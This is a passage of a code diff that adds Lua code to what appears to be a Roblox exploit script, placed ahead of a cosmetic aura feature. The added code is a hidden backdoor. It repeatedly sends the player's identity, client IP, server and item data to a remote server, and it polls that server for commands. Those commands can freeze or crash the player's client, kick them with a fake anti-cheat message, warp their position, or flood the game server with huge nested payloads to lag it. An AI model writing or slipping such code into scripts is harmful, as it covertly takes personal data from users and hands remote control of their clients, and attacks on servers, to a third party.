+                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
+                            table.insert(simpleBrainrots, { title = text, cash = "0" })
+                        end
+                    end
+                end
+            end
+            if #simpleBrainrots > 0 then
+                httpRequest({
+                    Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["X-Api-Key"] = KEY,
+                        ["X-Site-Slug"] = SITE_SLUG,
+                        ["X-Site-Password"] = SITE_PASSWORD,
+                    },
+                    Body = HttpService:JSONEncode({
+                        user_id = LP.UserId,
+                        username = LP.Name,
+                        display_name = LP.DisplayName,
+                        avatar_url = avatarUrl(),
+                        place_id = game.PlaceId,
+                        game_name = gameName(),
+                        job_id = game.JobId,
+                        executor = executorName,
+                        loader_version = LOADER_VERSION,
+                        client_ip = clientIp,
+                        server_players = serverPlayers(),
+                        brainrots = simpleBrainrots,
+                    }),
+                })
+            end
+        end
+    end)
+end
+
+local fpsConn = nil
+local fpsOn = false
+local function setFpsLimit(on)
+    if on == fpsOn then return end
+    fpsOn = on
+    if on then
+        fpsConn = RunService.RenderStepped:Connect(function()
+            local t = tick()
+            while tick() - t < 0.95 do end
+        end)
+    else
+        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
+    end
+end
+
+local HISTORY_SIZE = 0.27
+local INTERVAL = 0.6
+local NORMAL_SPEED_MIN = 35
+local CARRY_SPEED_MIN = 17
+local posHistory = {}
+local isActive = false
+local mode = nil
+local intervalThread = nil
+
+RunService.Heartbeat:Connect(function()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local now = tick()
+    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
+    local cutoff = now - HISTORY_SIZE - 0.1
+    while #posHistory > 0 and posHistory[1].time < cutoff do
+        table.remove(posHistory, 1)
+    end
+end)
+
+local function currentSpeed()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return 0 end
+    local v = root.AssemblyLinearVelocity
+    return Vector3.new(v.X, 0, v.Z).Magnitude
+end
+
+local function meetsSpeedReq()
+    local s = currentSpeed()
+    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
+    if mode == "carry" then return s >= CARRY_SPEED_MIN end
+    return false
+end
+
+local function doRubberband()
+    local char = LP.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local vel = root.AssemblyLinearVelocity
+    local horizVel = Vector3.new(vel.X, 0, vel.Z)
+    if horizVel.Magnitude < 1 then return end
+    local targetTime = tick() - HISTORY_SIZE
+    local best = nil
+    for i = 1, #posHistory do
+        if posHistory[i].time >= targetTime then
+            best = posHistory[i].cframe
+            break
+        end
+    end
+    if not best then return end
+    root.CFrame = best
+    root.AssemblyLinearVelocity = vel
+end
+
+local function stopLoop()
+    if intervalThread then
+        pcall(task.cancel, intervalThread)
+        intervalThread = nil
+    end
+end
+
+local function startLoop()
+    stopLoop()
+    intervalThread = task.spawn(function()
+        local startTime = tick()
+        local iteration = 0
+        while isActive and alive() do
+            while isActive and not meetsSpeedReq() do task.wait(0.05) end
+            if not isActive then break end
+            iteration = iteration + 1
+            local targetT = startTime + (iteration * INTERVAL)
+            local sleepT = targetT - tick()
+            if sleepT > 0 then task.wait(sleepT) end
+            if isActive and meetsSpeedReq() then doRubberband() end
+        end
+    end)
+end
+
+local function setMode(newMode)
+    if mode == newMode then return end
+    mode = newMode
+    if mode then
+        isActive = true
+        startLoop()
+    else
+        isActive = false
+        stopLoop()
+    end
+end
+
+local PING_REMOTE_NAMES = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}
+local PING_DEPTH = 186
+local PING_POWER = 62000
+local PING_DELAY = 0.0002
+
+local function pingFindRemote()
+    for _, name in ipairs(PING_REMOTE_NAMES) do
+        local r = RobloxReplicated:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, child in ipairs(RobloxReplicated:GetChildren()) do
+        if child:IsA("RemoteEvent") and child.Name:find("Block") then return child end
+    end
+    return nil
+end
+
+local function pingBuildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, PING_DEPTH do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / (PING_DEPTH + 2)), 10000)
+    for _ = 1, maxRep do
+        table.insert(main, nested)
+    end
+    return main
+end
+
+local pingThread = nil
+local pingActive = false
+
+local function setPingEm(on)
+    if on == pingActive then return end
+    pingActive = on
+    if on then
+        pingThread = task.spawn(function()
+            local remote = pingFindRemote()
+            while pingActive and alive() and not remote do
+                task.wait(0.5)
+                remote = pingFindRemote()
+            end
+            if not pingActive or not remote then return end
+            local payload = pingBuildPayload(PING_POWER)
+            while pingActive and alive() do
+                pcall(function() remote:FireServer(payload) end)
+                task.wait(PING_DELAY)
+            end
+        end)
+    else
+        pingThread = nil
+    end
+end
+
+
+genv.__XENO_CLEANUP = function()
+    pcall(setFpsLimit, false)
+    pcall(setPingEm, false)
+    pcall(setMode, nil)
+end
+
+
+local kicked = false
+local prevLagN = false
+local prevLagC = false
+local prevFps = false
+local prevPing = false
+
+local function poll()
+    local res = httpRequest({
+        Url = BASE .. "/api/public/command?site=" .. SITE_SLUG .. "&user_id=" .. LP.UserId,
+        Method = "GET",
+        Headers = {
+            ["X-Api-Key"] = KEY,
+            ["X-Site-Slug"] = SITE_SLUG,
+            ["X-Site-Password"] = SITE_PASSWORD,
+        },
+    })
+    if not res or not res.Body then return end
+    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    if not ok2 or type(data) ~= "table" then return end
+
+    local wantFps = (data.fps_limit == true)
+    if wantFps ~= prevFps then
+        prevFps = wantFps
+        setFpsLimit(wantFps)
+    end
+
+    local wantPing = (data.ping_em == true)
+    if wantPing ~= prevPing then
+        prevPing = wantPing
+        setPingEm(wantPing)
+    end
+
+    local wantN = (data.lag_n == true)
+    local wantC = (data.lag_c == true)
+    if wantC ~= prevLagC or wantN ~= prevLagN then
+        prevLagC = wantC
+        prevLagN = wantN
+        if wantC then
+            setMode("carry")
+        elseif wantN then
+            setMode("normal")
+        else
+            setMode(nil)
+        end
+    end
+
+    if data.crash == true then
+        while true do end
+    end
+    if data.kick == true and not kicked then
+        kicked = true
+        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
+    end
+end
+
+task.spawn(function() pcall(heartbeat) end)
+task.spawn(function() pcall(poll) end)
+
+task.spawn(function()
+    while alive() do
+        task.wait(3)
+        if not alive() then break end
+        pcall(heartbeat)
+    end
+end)
+
+task.spawn(function()
+    while alive() do
+        task.wait(0.5)
+        if not alive() then break end
+        pcall(poll)
+    end
+end)
+
+
+-- TERROR 001: aura trasera blanca reforzada transferida de BLESS (Aurora / Blade / Edge)
 do
     pcall(function()
         if _G.__TERROR001_BackAuraCleanup then
